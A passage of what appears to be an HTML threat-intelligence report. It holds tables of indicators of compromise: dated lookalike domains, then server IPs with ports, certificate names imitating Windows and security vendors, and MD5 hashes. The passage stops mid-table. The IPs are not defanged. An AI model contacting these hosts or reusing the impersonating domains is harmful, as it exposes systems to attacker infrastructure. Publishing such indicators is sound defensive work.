      <td width="87" valign="top"><p>10/19/20</p> </td> <td width="211"
        valign="top"><p>topbackupintheworld[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/19/20</p> </td> <td width="211"
        valign="top"><p>topbackup-helper[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/19/20</p> </td> <td width="211"
        valign="top"><p>simple-backupbooster[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/19/20</p> </td> <td width="211"
        valign="top"><p>top3-services[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/19/20</p> </td> <td width="211"
        valign="top"><p>backup1services[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>backupmaster-service[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>backupmasterservice[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>service1updater[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>driverdwl[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>backup1master[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>boost-yourservice[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>checktodrivers[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>backup1helper[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>driver1updater[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/21/20</p> </td> <td width="211"
        valign="top"><p>driver1master[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>view-backup[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>top3servicebooster[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>servicereader[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>servicehel[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>driver-boosters[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>service1update[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>service-hel[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>driver1downloads[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>service1view[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/23/20</p> </td> <td width="211"
        valign="top"><p>backups1helper[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/25/20</p> </td> <td width="211"
        valign="top"><p>idriveview[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/26/20</p> </td> <td width="211"
        valign="top"><p>debug-service[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/26/20</p> </td> <td width="211"
        valign="top"><p>idrivedwn[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/28/20</p> </td> <td width="211"
        valign="top"><p>driverjumper[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/28/20</p> </td> <td width="211"
        valign="top"><p>service1boost[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/28/20</p> </td> <td width="211"
        valign="top"><p>idriveupdate[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/28/20</p> </td> <td width="211"
        valign="top"><p>idrivehepler[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/28/20</p> </td> <td width="211"
        valign="top"><p>idrivefinder[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/28/20</p> </td> <td width="211"
        valign="top"><p>idrivecheck[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>10/28/20</p> </td> <td width="211"
        valign="top"><p>idrivedownload[.]com</p> </td> </tr></tbody></table>
 <p> </p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="116" valign="top"><p>
          <b>First Seen</b></p> </td> <td width="161" valign="top"><p>
          <b>Server</b></p> </td> <td width="447" valign="top"><p>
          <b>Subject</b></p> </td> <td width="271" valign="top"><p>
          <b>MD5</b></p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>12/12/19</p> </td> <td width="161"
        valign="top"><p>140.82.60.155:443</p> </td> <td width="447"
        valign="top"><p>CN=updatemanagir[.]us</p> </td> <td width="271"
        valign="top"><p>ec16be328c09473d5e5c07310583d85a</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>12/21/19</p> </td> <td width="161"
        valign="top"><p>96.30.192.141:443</p> </td> <td width="447"
        valign="top"><p>CN=cmdupdatewin[.]com</p> </td> <td width="271"
        valign="top"><p>3d4de17df25412bb714fda069f6eb27e</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/6/20</p> </td> <td width="161"
        valign="top"><p>45.76.49.78:443</p> </td> <td width="447"
        valign="top"><p>CN=scrservallinst[.]info</p> </td> <td
        width="271" valign="top"><p>cd6035bd51a44b597c1e181576dd44d9</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/8/20</p> </td> <td width="161"
        valign="top"><p>149.248.58.11:443</p> </td> <td width="447"
        valign="top"><p>CN=updatewinlsass[.]com</p> </td> <td
        width="271" valign="top"><p>8c581979bd11138ffa3a25b895b97cc0</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/9/20</p> </td> <td width="161"
        valign="top"><p>96.30.193.57:443</p> </td> <td width="447"
        valign="top"><p>CN=winsystemupdate[.]com</p> </td> <td
        width="271" valign="top"><p>e4e732502b9658ea3380847c60b9e0fe</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/14/20</p> </td> <td width="161"
        valign="top"><p>95.179.219.169:443</p> </td> <td width="447"
        valign="top"><p>CN=jomamba[.]best</p> </td> <td width="271"
        valign="top"><p>80b7001e5a6e4bd6ec79515769b91c8b</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/16/20</p> </td> <td width="161"
        valign="top"><p>140.82.27.146:443</p> </td> <td width="447"
        valign="top"><p>CN=winsysteminfo[.]com</p> </td> <td width="271"
        valign="top"><p>29e656ba9d5d38a0c17a4f0dd855b37e</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/19/20</p> </td> <td width="161"
        valign="top"><p>45.32.170.9:443</p> </td> <td width="447"
        valign="top"><p>CN=livecheckpointsrs[.]com</p> </td> <td
        width="271" valign="top"><p>1de9e9aa8363751c8a71c43255557a97</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/20/20</p> </td> <td width="161"
        valign="top"><p>207.148.8.61:443</p> </td> <td width="447"
        valign="top"><p>CN=ciscocheckapi[.]com</p> </td> <td width="271"
        valign="top"><p>97ca76ee9f02cfda2e8e9729f69bc208</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/28/20</p> </td> <td width="161"
        valign="top"><p>209.222.108.106:443</p> </td> <td width="447"
        valign="top"><p>CN=timesshifts[.]com</p> </td> <td width="271"
        valign="top"><p>2bb464585f42180bddccb50c4a4208a5</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/29/20</p> </td> <td width="161"
        valign="top"><p>31.7.59.141:443</p> </td> <td width="447"
        valign="top"><p>CN=updatewinsoftr[.]com</p> </td> <td
        width="271" valign="top"><p>07f9f766163c344b0522e4e917035fe1</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/29/20</p> </td> <td width="161"
        valign="top"><p>79.124.60.117:443</p> </td> <td width="447"
        valign="top"><p>C=US</p> </td> <td width="271"
        valign="top"><p>9722acc9740d831317dd8c1f20d8cfbe</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/29/20</p> </td> <td width="161"
        valign="top"><p>66.42.86.61:443</p> </td> <td width="447"
        valign="top"><p>CN=lsassupdate[.]com</p> </td> <td width="271"
        valign="top"><p>3c9b3f1e12473a0fd28dc37071168870</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/29/20</p> </td> <td width="161"
        valign="top"><p>45.76.20.140:443</p> </td> <td width="447"
        valign="top"><p>CN=cylenceprotect[.]com</p> </td> <td
        width="271" valign="top"><p>da6ce63f4a52244c3dced32f7164038a</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/29/20</p> </td> <td width="161"
        valign="top"><p>45.76.20.140:80</p> </td> <td width="447"
        valign="top"><p>CN=cylenceprotect[.]com</p> </td> <td
        width="271" valign="top"><p>da6ce63f4a52244c3dced32f7164038a</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>149.248.5.240:443</p> </td> <td width="447"
        valign="top"><p>CN=sophosdefence[.]com</p> </td> <td width="271"
        valign="top"><p>e9b4b649c97cdd895d6a0c56015f2e68</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>144.202.12.197:80</p> </td> <td width="447"
        valign="top"><p>CN=windefenceinfo[.]com</p> </td> <td
        width="271" valign="top"><p>c6c63024b18f0c5828bd38d285e6aa58</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>149.248.5.240:80</p> </td> <td width="447"
        valign="top"><p>CN=sophosdefence[.]com</p> </td> <td width="271"
        valign="top"><p>e9b4b649c97cdd895d6a0c56015f2e68</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>149.28.246.25:80</p> </td> <td width="447"
        valign="top"><p>CN=lsasswininfo[.]com</p> </td> <td width="271"
        valign="top"><p>f9af8b7ddd4875224c7ce8aae8c1b9dd</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>144.202.12.197:443</p> </td> <td width="447"
        valign="top"><p>CN=windefenceinfo[.]com</p> </td> <td
        width="271" valign="top"><p>c6c63024b18f0c5828bd38d285e6aa58</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>149.28.246.25:443</p> </td> <td width="447"
        valign="top"><p>CN=lsasswininfo[.]com</p> </td> <td width="271"
        valign="top"><p>f9af8b7ddd4875224c7ce8aae8c1b9dd</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>45.77.119.212:443</p> </td> <td width="447"
        valign="top"><p>CN=taskshedulewin[.]com</p> </td> <td
        width="271" valign="top"><p>e1dc7cecd3cb225b131bdb71df4b3079</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>45.77.119.212:80</p> </td> <td width="447"
        valign="top"><p>CN=taskshedulewin[.]com</p> </td> <td
        width="271" valign="top"><p>e1dc7cecd3cb225b131bdb71df4b3079</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>149.28.122.130:443</p> </td> <td width="447"
        valign="top"><p>CN=renovatesystem[.]com</p> </td> <td
        width="271" valign="top"><p>734c26d93201cf0c918135915fdf96af</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>45.32.170.9:80</p> </td> <td width="447"
        valign="top"><p>CN=livecheckpointsrs[.]com</p> </td> <td
        width="271" valign="top"><p>1de9e9aa8363751c8a71c43255557a97</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>149.248.58.11:80</p> </td> <td width="447"
        valign="top"><p>CN=updatewinlsass[.]com</p> </td> <td
        width="271" valign="top"><p>8c581979bd11138ffa3a25b895b97cc0</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>149.28.122.130:80</p> </td> <td width="447"
        valign="top"><p>CN=renovatesystem[.]com</p> </td> <td
        width="271" valign="top"><p>734c26d93201cf0c918135915fdf96af</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/30/20</p> </td> <td width="161"
        valign="top"><p>207.148.8.61:80</p> </td> <td width="447"
        valign="top"><p>CN=ciscocheckapi[.]com</p> </td> <td width="271"
        valign="top"><p>97ca76ee9f02cfda2e8e9729f69bc208</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/31/20</p> </td> <td width="161"
        valign="top"><p>81.17.25.210:443</p> </td> <td width="447"
        valign="top"><p>CN=update-wind[.]com</p> </td> <td width="271"
        valign="top"><p>877bf6c685b68e6ddf23a4db3789fcaa</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>1/31/20</p> </td> <td width="161"
        valign="top"><p>31.7.59.141:80</p> </td> <td width="447"
        valign="top"><p>CN=updatewinsoftr[.]com</p> </td> <td
        width="271" valign="top"><p>07f9f766163c344b0522e4e917035fe1</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/2/20</p> </td> <td width="161"
        valign="top"><p>155.138.214.247:80</p> </td> <td width="447"
        valign="top"><p>CN=cleardefencewin[.]com</p> </td> <td
        width="271" valign="top"><p>61df4864dc2970de6dcee65827cc9a54</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/2/20</p> </td> <td width="161"
        valign="top"><p>155.138.214.247:443</p> </td> <td width="447"
        valign="top"><p>CN=cleardefencewin[.]com</p> </td> <td
        width="271" valign="top"><p>61df4864dc2970de6dcee65827cc9a54</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/2/20</p> </td> <td width="161"
        valign="top"><p>45.76.231.195:443</p> </td> <td width="447"
        valign="top"><p>CN=checkwinupdate[.]com</p> </td> <td
        width="271" valign="top"><p>d8e5dddeec1a9b366759c7ef624d3b8c</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/2/20</p> </td> <td width="161"
        valign="top"><p>45.76.231.195:80</p> </td> <td width="447"
        valign="top"><p>CN=checkwinupdate[.]com</p> </td> <td
        width="271" valign="top"><p>d8e5dddeec1a9b366759c7ef624d3b8c</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/3/20</p> </td> <td width="161"
        valign="top"><p>46.19.142.154:443</p> </td> <td width="447"
        valign="top"><p>CN=havesetup[.]net</p> </td> <td width="271"
        valign="top"><p>cd354c309f3229aff59751e329d8243a</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/3/20</p> </td> <td width="161"
        valign="top"><p>95.179.219.169:80</p> </td> <td width="447"
        valign="top"><p>CN=jomamba[.]best</p> </td> <td width="271"
        valign="top"><p>80b7001e5a6e4bd6ec79515769b91c8b</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/3/20</p> </td> <td width="161"
        valign="top"><p>140.82.60.155:80</p> </td> <td width="447"
        valign="top"><p>CN=updatemanagir[.]us</p> </td> <td width="271"
        valign="top"><p>ec16be328c09473d5e5c07310583d85a</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/3/20</p> </td> <td width="161"
        valign="top"><p>209.222.108.106:80</p> </td> <td width="447"
        valign="top"><p>CN=timesshifts[.]com</p> </td> <td width="271"
        valign="top"><p>2bb464585f42180bddccb50c4a4208a5</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/3/20</p> </td> <td width="161"
        valign="top"><p>66.42.118.123:443</p> </td> <td width="447"
        valign="top"><p>CN=conhostservice[.]com</p> </td> <td
        width="271" valign="top"><p>6c21d3c5f6e8601e92ae167a7cff721c</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/4/20</p> </td> <td width="161"
        valign="top"><p>80.240.18.106:443</p> </td> <td width="447"
        valign="top"><p>CN=microsoftupdateswin[.]com</p> </td> <td
        width="271" valign="top"><p>27cae092ad6fca89cd1b05ef1bb73e62</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/4/20</p> </td> <td width="161"
        valign="top"><p>95.179.215.228:443</p> </td> <td width="447"
        valign="top"><p>CN=iexploreservice[.]com</p> </td> <td
        width="271" valign="top"><p>26010bebe046b3a33bacd805c2617610</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/12/20</p> </td> <td width="161"
        valign="top"><p>155.138.216.133:443</p> </td> <td width="447"
        valign="top"><p>CN=defenswin[.]com</p> </td> <td width="271"
        valign="top"><p>e5005ae0771fcc165772a154b7937e89</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/12/20</p> </td> <td width="161"
        valign="top"><p>45.32.130.5:443</p> </td> <td width="447"
        valign="top"><p>CN=avrenew[.]com</p> </td> <td width="271"
        valign="top"><p>f32ee1bb35102e5d98af81946726ec1b</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/14/20</p> </td> <td width="161"
        valign="top"><p>45.76.167.35:443</p> </td> <td width="447"
        valign="top"><p>CN=freeallsafe[.]com</p> </td> <td width="271"
        valign="top"><p>85f743a071a1d0b74d8e8322fecf832b</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/14/20</p> </td> <td width="161"
        valign="top"><p>45.63.95.187:443</p> </td> <td width="447"
        valign="top"><p>CN=easytus[.]com</p> </td> <td width="271"
        valign="top"><p>17de38c58e04242ee56a9f3a94e6fd53</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>45.77.89.31:443</p> </td> <td width="447"
        valign="top"><p>CN=besttus[.]com</p> </td> <td width="271"
        valign="top"><p>2bda8217bdb05642c995401af3b5c1f3</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>95.179.147.215:443</p> </td> <td width="447"
        valign="top"><p>CN=windefens[.]com</p> </td> <td width="271"
        valign="top"><p>57725c8db6b98a3361e0d905a697f9f8</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>155.138.216.133:443</p> </td> <td width="447"
        valign="top"><p>CN=defenswin[.]com</p> </td> <td width="271"
        valign="top"><p>c07774a256fc19036f5c8c60ba418cbf</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>104.238.190.126:443</p> </td> <td width="447"
        valign="top"><p>CN=aaatus[.]com</p> </td> <td width="271"
        valign="top"><p>4039af00ce7a5287a3e564918edb77cf</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>144.202.83.4:443</p> </td> <td width="447"
        valign="top"><p>CN=greattus[.]com</p> </td> <td width="271"
        valign="top"><p>7f0fa9a608090634b42f5f17b8cecff0</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>104.156.245.0:443</p> </td> <td width="447"
        valign="top"><p>CN=comssite[.]com</p> </td> <td width="271"
        valign="top"><p>f5bb98fafe428be6a8765e98683ab115</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>45.32.30.162:443</p> </td> <td width="447"
        valign="top"><p>CN=bigtus[.]com</p> </td> <td width="271"
        valign="top"><p>698fc23ae111381183d0b92fe343b28b</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>108.61.242.184:443</p> </td> <td width="447"
        valign="top"><p>CN=livetus[.]com</p> </td> <td width="271"
        valign="top"><p>8bedba70f882c45f968c2d99b00a708a</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>207.148.15.31:443</p> </td> <td width="447"
        valign="top"><p>CN=findtus[.]com</p> </td> <td width="271"
        valign="top"><p>15f07ca2f533f0954bbbc8d4c64f3262</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/17/20</p> </td> <td width="161"
        valign="top"><p>149.28.15.247:443</p> </td> <td width="447"
        valign="top"><p>CN=firsttus[.]com</p> </td> <td width="271"
        valign="top"><p>88e8551f4364fc647dbf00796536a4c7</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/21/20</p> </td> <td width="161"
        valign="top"><p>155.138.136.182:443</p> </td> <td width="447"
        valign="top"><p>CN=worldtus[.]com</p> </td> <td width="271"
        valign="top"><p>b31f38b2ccbbebf4018fe5665173a409</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/25/20</p> </td> <td width="161"
        valign="top"><p>45.77.58.172:443</p> </td> <td width="447"
        valign="top"><p>CN=freeoldsafe[.]com</p> </td> <td width="271"
        valign="top"><p>a46e77b92e1cdfec82239ff54f2c1115</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/25/20</p> </td> <td width="161"
        valign="top"><p>45.77.58.172:443</p> </td> <td width="447"
        valign="top"><p>CN=freeoldsafe[.]com</p> </td> <td width="271"
        valign="top"><p>a46e77b92e1cdfec82239ff54f2c1115</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/26/20</p> </td> <td width="161"
        valign="top"><p>108.61.72.29:443</p> </td> <td width="447"
        valign="top"><p>CN=myserviceconnect[.]net</p> </td> <td
        width="271" valign="top"><p>9f551008f6dcaf8e6fe363caa11a1aed</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/27/20</p> </td> <td width="161"
        valign="top"><p>216.155.157.249:443</p> </td> <td width="447"
        valign="top"><p>CN=myserviceupdater[.]com</p> </td> <td
        width="271" valign="top"><p>4c6a2c06f1e1d15d6be8c81172d1c50c</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/28/20</p> </td> <td width="161"
        valign="top"><p>45.77.98.157:443</p> </td> <td width="447"
        valign="top"><p>CN=topservicesbooster[.]com</p> </td> <td
        width="271" valign="top"><p>ba4b34962390893852e5cc7fa7c75ba2</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/28/20</p> </td> <td width="161"
        valign="top"><p>104.156.250.132:443</p> </td> <td width="447"
        valign="top"><p>CN=myservicebooster[.]com</p> </td> <td
        width="271" valign="top"><p>89be5670d19608b2c8e261f6301620e1</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/28/20</p> </td> <td width="161"
        valign="top"><p>149.28.50.31:443</p> </td> <td width="447"
        valign="top"><p>CN=topsecurityservice[.]net</p> </td> <td
        width="271" valign="top"><p>77e2878842ab26beaa3ff24a5b64f09b</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/28/20</p> </td> <td width="161"
        valign="top"><p>149.28.55.197:443</p> </td> <td width="447"
        valign="top"><p>CN=myyserviceupdater[.]com</p> </td> <td
        width="271" valign="top"><p>0dd8fde668ff8a301390eef1ad2f9b83</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/28/20</p> </td> <td width="161"
        valign="top"><p>207.246.67.70:443</p> </td> <td width="447"
        valign="top"><p>CN=servicesecurity[.]org</p> </td> <td
        width="271" valign="top"><p>c88098f9a92d7256425f782440971497</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/28/20</p> </td> <td width="161"
        valign="top"><p>63.209.33.131:443</p> </td> <td width="447"
        valign="top"><p>CN=serviceupdates[.]net</p> </td> <td
        width="271" valign="top"><p>16e86a9be2bdf0ddc896bc48fcdbb632</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>45.77.206.105:443</p> </td> <td width="447"
        valign="top"><p>CN=myservicebooster[.]net</p> </td> <td
        width="271" valign="top"><p>6e09bb541b29be7b89427f9227c30a32</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>140.82.5.67:443</p> </td> <td width="447"
        valign="top"><p>CN=servicesbooster[.]org</p> </td> <td
        width="271" valign="top"><p>42d2d09d08f60782dc4cded98d7984ed</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>108.61.209.123:443</p> </td> <td width="447"
        valign="top"><p>CN=brainschampions[.]com</p> </td> <td
        width="271" valign="top"><p>241ab042cdcb29df0a5c4f853f23dd31</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>104.156.227.250:443</p> </td> <td width="447"
        valign="top"><p>CN=servicesbooster[.]com</p> </td> <td
        width="271" valign="top"><p>f45f9296ff2a6489a4f39cd79c7f5169</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>140.82.10.222:443</p> </td> <td width="447"
        valign="top"><p>CN=topservicesecurity[.]net</p> </td> <td
        width="271" valign="top"><p>b9375e7df4ee0f83d7abb179039dc2c5</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>149.28.35.35:443</p> </td> <td width="447"
        valign="top"><p>CN=topservicesecurity[.]org</p> </td> <td
        width="271" valign="top"><p>82bd8a2b743c7cc3f3820e386368951d</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>207.148.21.17:443</p> </td> <td width="447"
        valign="top"><p>CN=topserviceupdater[.]com</p> </td> <td
        width="271" valign="top"><p>ece184f8a1309b781f912d4f4d65738e</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>2/29/20</p> </td> <td width="161"
        valign="top"><p>45.77.153.72:443</p> </td> <td width="447"
        valign="top"><p>CN=topservicesupdate[.]com</p> </td> <td
        width="271" valign="top"><p>8330c3fa8ca31a76dc8d7818fd378794</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/1/20</p> </td> <td width="161"
        valign="top"><p>140.82.10.222:80</p> </td> <td width="447"
        valign="top"><p>CN=topservicesecurity[.]net</p> </td> <td
        width="271" valign="top"><p>b9375e7df4ee0f83d7abb179039dc2c5</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/1/20</p> </td> <td width="161"
        valign="top"><p>207.148.21.17:80</p> </td> <td width="447"
        valign="top"><p>CN=topserviceupdater[.]com</p> </td> <td
        width="271" valign="top"><p>ece184f8a1309b781f912d4f4d65738e</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/1/20</p> </td> <td width="161"
        valign="top"><p>108.61.90.90:443</p> </td> <td width="447"
        valign="top"><p>CN=topservicesecurity[.]com</p> </td> <td
        width="271" valign="top"><p>696aeb86d085e4f6032e0a01c496d26c</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/1/20</p> </td> <td width="161"
        valign="top"><p>45.32.130.5:80</p> </td> <td width="447"
        valign="top"><p>CN=avrenew[.]com</p> </td> <td width="271"
        valign="top"><p>f32ee1bb35102e5d98af81946726ec1b</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/2/20</p> </td> <td width="161"
        valign="top"><p>217.69.15.175:443</p> </td> <td width="447"
        valign="top"><p>CN=serviceshelpers[.]com</p> </td> <td
        width="271" valign="top"><p>9a437489c9b2c19c304d980c17d2e0e9</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/2/20</p> </td> <td width="161"
        valign="top"><p>155.138.135.182:443</p> </td> <td width="447"
        valign="top"><p>CN=topservicesupdates[.]com</p> </td> <td
        width="271" valign="top"><p>b9deff0804244b52b14576eac260fd9f</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/2/20</p> </td> <td width="161"
        valign="top"><p>95.179.210.8:80</p> </td> <td width="447"
        valign="top"><p>CN=serviceuphelper[.]com</p> </td> <td
        width="271" valign="top"><p>bb65efcead5b979baee5a25756e005d8</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/2/20</p> </td> <td width="161"
        valign="top"><p>45.76.45.162:443</p> </td> <td width="447"
        valign="top"><p>CN=boostsecuritys[.]com</p> </td> <td
        width="271" valign="top"><p>7d316c63bdc4e981344e84a017ae0212</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/4/20</p> </td> <td width="161"
        valign="top"><p>108.61.176.237:443</p> </td> <td width="447"
        valign="top"><p>CN=yoursuperservice[.]com</p> </td> <td
        width="271" valign="top"><p>7424aaede2f35259cf040f3e70d707be</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/4/20</p> </td> <td width="161"
        valign="top"><p>207.246.67.70:443</p> </td> <td width="447"
        valign="top"><p>CN=servicesecurity[.]org</p> </td> <td
        width="271" valign="top"><p>d66cb5528d2610b39bc3cecc20198970</p>
      </td> </tr>
    <tr>
      <td width="116" valign="top"><p>3/6/20</p> </td> <td width="161"
